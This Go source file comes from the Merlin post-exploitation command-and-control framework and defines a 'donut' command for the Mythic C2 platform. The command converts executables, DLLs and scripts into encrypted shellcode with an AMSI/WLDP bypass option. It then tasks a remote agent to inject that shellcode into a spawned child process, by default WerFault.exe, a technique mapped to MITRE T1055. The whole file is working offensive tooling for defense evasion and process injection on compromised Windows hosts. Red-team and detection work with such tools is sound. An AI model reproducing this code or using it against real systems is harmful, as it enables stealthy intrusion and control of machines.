/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023  Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as
published by the Free Software Foundation, either version 3 of the License, or any later version.

Merlin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"bytes"
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"

	// 3rd Party
	"github.com/Binject/go-donut/donut"

	// Mythic
	structs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"

	// Merlin Message
	"github.com/Ne0nd0g/merlin-message/jobs"
)

func donutCmd() structs.Command {
	attr := structs.CommandAttribute{
		SupportedOS: []string{structs.SUPPORTED_OS_WINDOWS},
	}

	file := structs.CommandParameter{
		Name:                                    "file",
		ModalDisplayName:                        "in",
		CLIName:                                 "",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_FILE,
		Description:                             "NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory",
		Choices:                                 nil,
		DefaultValue:                            nil,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       0,
				AdditionalInformation: nil,
			},
		},
	}

	filename := structs.CommandParameter{
		Name:                                    "filename",
		ModalDisplayName:                        "in",
		CLIName:                                 "i",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             ".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory",
		Choices:                                 []string{""},
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    GetFileList,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       0,
				AdditionalInformation: nil,
			},
		},
	}

	module := structs.CommandParameter{
		Name:                                    "module",
		ModalDisplayName:                        "module",
		CLIName:                                 "n",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Module name. Randomly generated by default with entropy enabled",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       1,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       1,
				AdditionalInformation: nil,
			},
		},
	}

	url := structs.CommandParameter{
		Name:                                    "url",
		ModalDisplayName:                        "url",
		CLIName:                                 "u",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "HTTP server that will host the donut module",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       2,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       2,
				AdditionalInformation: nil,
			},
		},
	}

	entropy := structs.CommandParameter{
		Name:                                    "entropy",
		ModalDisplayName:                        "entropy",
		CLIName:                                 "e",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "1=disable, 2=use random names, 3=random names + symmetric encryption (default)",
		Choices:                                 []string{"1", "2", "3"},
		DefaultValue:                            "3",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       3,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       3,
				AdditionalInformation: nil,
			},
		},
	}

	arch := structs.CommandParameter{
		Name:                                    "arch",
		ModalDisplayName:                        "arch",
		CLIName:                                 "a",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "Target Architecture: x32, x64, or x84",
		Choices:                                 []string{"x84", "x64", "x32"},
		DefaultValue:                            "x84",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       4,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       4,
				AdditionalInformation: nil,
			},
		},
	}

	bypass := structs.CommandParameter{
		Name:                                    "bypass",
		ModalDisplayName:                        "bypass",
		CLIName:                                 "b",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail",
		Choices:                                 []string{"3", "2", "1"},
		DefaultValue:                            "3",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       5,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       5,
				AdditionalInformation: nil,
			},
		},
	}

	entrypoint := structs.CommandParameter{
		Name:                                    "entrypoint",
		ModalDisplayName:                        "OEP",
		CLIName:                                 "y",
		ParameterType:                           structs.BUILD_PARAMETER_TYPE_BOOLEAN,
		Description:                             "Create a new thread for loader. Optionally execute original entrypoint of host process",
		Choices:                                 nil,
		DefaultValue:                            false,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       6,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       6,
				AdditionalInformation: nil,
			},
		},
	}

	exit := structs.CommandParameter{
		Name:                                    "exit",
		ModalDisplayName:                        "exit",
		CLIName:                                 "x",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "Exiting. 1=exit thread, 2=exit process",
		Choices:                                 []string{"1", "2"},
		DefaultValue:                            "2",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       7,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       7,
				AdditionalInformation: nil,
			},
		},
	}

	class := structs.CommandParameter{
		Name:                                    "class",
		ModalDisplayName:                        "class",
		CLIName:                                 "c",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Optional class name.  (required for .NET DLL)",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       8,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       8,
				AdditionalInformation: nil,
			},
		},
	}

	domain := structs.CommandParameter{
		Name:                                    "domain",
		ModalDisplayName:                        "domain",
		CLIName:                                 "d",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "AppDomain name to create for .NET.  Randomly generated by default with entropy enabled",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       9,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       9,
				AdditionalInformation: nil,
			},
		},
	}

	method := structs.CommandParameter{
		Name:                                    "method",
		ModalDisplayName:                        "method",
		CLIName:                                 "m",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Optional method or API name for DLL. (a method is required for .NET DLL)",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       10,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       10,
				AdditionalInformation: nil,
			},
		},
	}

	parameters := structs.CommandParameter{
		Name:                                    "parameters",
		ModalDisplayName:                        "params",
		CLIName:                                 "p",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Optional parameters/command line inside quotations for DLL method/function or EXE.",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       11,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       11,
				AdditionalInformation: nil,
			},
		},
	}

	unicode := structs.CommandParameter{
		Name:                                    "unicode",
		ModalDisplayName:                        "unicode",
		CLIName:                                 "w",
		ParameterType:                           structs.BUILD_PARAMETER_TYPE_BOOLEAN,
		Description:                             "Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)",
		Choices:                                 nil,
		DefaultValue:                            false,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       12,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       12,
				AdditionalInformation: nil,
			},
		},
	}

	runtime := structs.CommandParameter{
		Name:                                    "runtime",
		ModalDisplayName:                        "runtime",
		CLIName:                                 "r",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "CLR runtime version. This will override the auto-detected version",
		Choices:                                 nil,
		DefaultValue:                            "v4.0.30319",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       13,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       13,
				AdditionalInformation: nil,
			},
		},
	}

	thread := structs.CommandParameter{
		Name:                                    "thread",
		ModalDisplayName:                        "thread",
		CLIName:                                 "t",
		ParameterType:                           structs.BUILD_PARAMETER_TYPE_BOOLEAN,
		Description:                             "Create new thread for entrypoint of unmanaged EXE",
		Choices:                                 nil,
		DefaultValue:                            false,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       14,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       14,
				AdditionalInformation: nil,
			},
		},
	}

	compress := structs.CommandParameter{
		Name:                                    "compress",
		ModalDisplayName:                        "compress",
		CLIName:                                 "z",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "Pack/Compress file. 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman",
		Choices:                                 []string{"1", "2", "3", "4"},
		DefaultValue:                            "1",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       15,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       15,
				AdditionalInformation: nil,
			},
		},
	}

	donutType := structs.CommandParameter{
		Name:                                    "type",
		ModalDisplayName:                        "type",
		CLIName:                                 "type",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "Source file type. NET_EXE is for a NET executable.",
		Choices:                                 []string{"NET_DLL", "NET_EXE", "DLL", "EXE", "VBS", "JS", "XSL"},
		DefaultValue:                            "EXE",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       16,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       16,
				AdditionalInformation: nil,
			},
		},
	}

	spawnto := structs.CommandParameter{
		Name:                                    "spawnto",
		ModalDisplayName:                        "SpawnTo Program",
		CLIName:                                 "spawnto",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "The child process to inject and execute the donut generated shellcode",
		Choices:                                 nil,
		DefaultValue:                            "C:\\Windows\\System32\\WerFault.exe",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       17,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       17,
				AdditionalInformation: nil,
			},
		},
	}

	spawntoargs := structs.CommandParameter{
		Name:                                    "spawntoargs",
		ModalDisplayName:                        "SpawnTo Arguments",
		CLIName:                                 "args",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Arguments to create the spawnto process with, if any",
		Choices:                                 []string{},
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       18,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       18,
				AdditionalInformation: nil,
			},
		},
	}

	params := []structs.CommandParameter{module, url, entropy, arch, bypass, entrypoint, exit, class, domain, method, parameters, unicode, runtime, thread, compress, donutType, spawnto, spawntoargs, file, filename}

	command := structs.Command{
		Name:                           "donut",
		NeedsAdminPermissions:          false,
		HelpString:                     "donut -n <module name> -u <url> -e <entropy: 1,2,3> -a <arch> -b <bypass: 1,2,3> -y <entrypoint> -x <exit: 1,2> -c <class name> -d <domain> -m <method> -p <params> -r <runtime version> -t -z <compress: 1,2,3,4> -i <input filename> -v",
		Description:                    "Convert a VBS/JS or PE/.NET EXE/DLL to shellcode. Only the finest artisanal donuts are made of shells. Uses the go-donut project at https://github.com/Binject/go-donut . Change the Parameter Group to \"Default\" to use a file that was previously registered with Mythic and \"New File\" to register and use a new file from your host OS.",
		Version:                        0,
		SupportedUIFeatures:            nil,
		Author:                         "@Ne0nd0g",
		MitreAttackMappings:            []string{"T1055"},
		ScriptOnlyCommand:              false,
		CommandAttributes:              attr,
		CommandParameters:              params,
		AssociatedBrowserScript:        nil,
		TaskFunctionOPSECPre:           nil,
		TaskFunctionCreateTasking:      donutCreateTasking,
		TaskFunctionProcessResponse:    nil,
		TaskFunctionOPSECPost:          nil,
		TaskFunctionParseArgString:     taskFunctionParseArgString,
		TaskFunctionParseArgDictionary: taskFunctionParseArgDictionary,
		TaskCompletionFunctions:        nil,
	}

	return command
}

func donutCreateTasking(task *structs.PTTaskMessageAllData) (resp structs.PTTaskCreateTaskingMessageResponse) {
	pkg := "mythic/container/commands/donut/donutCreateTask()"
	resp.TaskID = task.Task.ID

	// Get the file as a byte array, its name, and any errors
	data, _, err := GetFile(task)
	if err != nil {
		err = fmt.Errorf("%s: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// module, url, entropy, arch, bypass, entrypoint, exit, class, domain, method, parameters, unicode, runtime, thread, compress, spawnto, spawntoargs

	// Module
	module, err := task.Args.GetStringArg("module")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'module' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// URL
	url, err := task.Args.GetStringArg("url")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'url' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	instanceType := donut.DONUT_INSTANCE_PIC
	if url != "" {
		instanceType = donut.DONUT_INSTANCE_URL
	}

	// Entropy
	e, err := task.Args.GetStringArg("entropy")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'entropy' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}
	entropy, err := strconv.ParseUint(e, 10, 32)
	if err != nil {
		err = fmt.Errorf("%s: there was an error converting the 'entropy' command argument to an integer: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}

	// Arch
	a, err := task.Args.GetStringArg("arch")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'arch' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}
	var arch donut.DonutArch
	switch strings.ToLower(a) {
	case "x32":
		arch = donut.X32
	case "x64":
		arch = donut.X64
	case "x84":
		arch = donut.X84
	default:
		arch = donut.X84
	}

	// Type
	var modType donut.ModuleType
	donutType, err := task.Args.GetStringArg("type")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'type' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}
	switch strings.ToLower(donutType) {
	case "net_dll":
		modType = donut.DONUT_MODULE_NET_DLL
	case "net_exe":
		modType = donut.DONUT_MODULE_NET_EXE
	case "dll":
		modType = donut.DONUT_MODULE_DLL
	case "exe":
		modType = donut.DONUT_MODULE_EXE
	case "vbs":
		modType = donut.DONUT_MODULE_VBS
	case "js":
		modType = donut.DONUT_MODULE_JS
	case "xsl":
		modType = donut.DONUT_MODULE_XSL
	default:
		resp.Error = fmt.Sprintf("invalid donut module type: %s", donutType)
		resp.Success = false
		return
	}

	// Bypass - AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail
	b, err := task.Args.GetStringArg("bypass")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'bypass' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}
	bypass, err := strconv.Atoi(b)
	if err != nil {
		err = fmt.Errorf("%s: there was an error converting the 'bypass' command argument to an integer: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
		return
	}
	switch bypass {
	case 1:
	case 2:
	case 3:
	default:
		bypass = 1
	}

	// Entrypoint
	ent, err := task.Args.GetBooleanArg("entrypoint")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'entrypoint' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}
	var entrypoint uint64
	if ent {
		entrypoint = 1
	}

	// Exit - 1=exit thread, 2=exit process
	ex, err := task.Args.GetStringArg("exit")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'exit' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}
	exit, err := strconv.ParseUint(ex, 10, 32)
	if err != nil {
		err = fmt.Errorf("%s: there was an error converting the 'exit' command argument to an integer: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}
	switch exit {
	case 1:
	case 2:
	default:
		exit = 2
	}

	// Class
	class, err := task.Args.GetStringArg("class")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'class' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	// Domain
	domain, err := task.Args.GetStringArg("domain")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'domain' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	// Method
	method, err := task.Args.GetStringArg("method")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'method' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	// Parameters
	parameters, err := task.Args.GetStringArg("parameters")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'parameters' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	// Unicode
	u, err := task.Args.GetBooleanArg("unicode")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'unicode' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}
	var unicode uint32
	if u {
		unicode = 1
	}

	// Runtime
	runtime, err := task.Args.GetStringArg("runtime")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'runtime' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	// Thread
	t, err := task.Args.GetBooleanArg("thread")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'thread' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}
	var thread uint32
	if t == true {
		thread = 1
	}

	// Compress - Pack/Compress file. 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman
	comp, err := task.Args.GetStringArg("compress")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'compress' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}
	compress, err := strconv.ParseUint(comp, 10, 32)
	if err != nil {
		err = fmt.Errorf("%s: there was an error converting the 'compress' command argument to an integer: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}
	switch compress {
	case 1:
	case 2:
	case 3:
	case 4:
	default:
		compress = 1
	}

	// SpawnTo
	spawnto, err := task.Args.GetStringArg("spawnto")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'spawnto' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	// SpawnTo Args
	spawntoargs, err := task.Args.GetStringArg("spawntoargs")
	if err != nil {
		err = fmt.Errorf("%s: there was an error getting the 'spawntoargs' argument: %s", pkg, err)
		resp.Error = err.Error()
		resp.Success = false
		logging.LogError(err, "returning with error")
	}

	config := donut.DonutConfig{
		Arch:       arch,
		Type:       modType, // NET_DLL, NET_EXE, EXE, DLL, JS, VBS, XSL
		InstType:   instanceType,
		Parameters: parameters,
		Entropy:    uint32(entropy),
		Thread:     thread,
		Compress:   uint32(compress),
		Unicode:    unicode,
		OEP:        entrypoint,
		ExitOpt:    uint32(exit),
		Format:     2, // 1=Binary (default), 2=Base64, 3=C, 4=Ruby, 5=Python, 6=PowerShell, 7=C#, 8=Hexadecimal
		Domain:     domain,
		Class:      class,
		Method:     method,
		Runtime:    runtime,
		Bypass:     bypass,
		Module:     nil,
		ModuleName: module,
		URL:        url,
		ModuleMac:  0,
		ModuleData: nil,
		Verbose:    false,
	}

	// Get the assembly and turn it into a *bytes.buffer
	buff := bytes.NewBuffer(data)
	var shellcode *bytes.Buffer
	if url == "" {
		shellcode, err = donut.ShellcodeFromBytes(buff, &config)
		if err != nil {
			resp.Error = fmt.Sprintf("there was an error generating the shellcode from Donut: %s", err)
			resp.Success = false
			return
		}
	} else {
		shellcode, err = donut.ShellcodeFromURL(url, &config)
		if err != nil {
			resp.Error = fmt.Sprintf("there was an error generating the shellcode from Donut: %s", err)
			resp.Success = false
			return
		}
	}

	//  Merlin Job
	// Command: createprocess
	// Arguments:
	// 1. File contents as Base64 string
	// 2. SpawnTo executable file path on host where the Agent is running
	// 3. SpawnTo arguments

	job := jobs.Command{
		Command: "createprocess",
		Args:    []string{base64.StdEncoding.EncodeToString(shellcode.Bytes()), spawnto, spawntoargs},
	}

	mythicJob, err := ConvertMerlinJobToMythicTask(job, jobs.MODULE)
	if err != nil {
		resp.Error = fmt.Sprintf("mythic/container/commands/donut/donutCreateTasking(): %s", err)
		resp.Success = false
		return
	}

	task.Args.SetManualArgs(mythicJob)

	resp.Success = true
	return
}
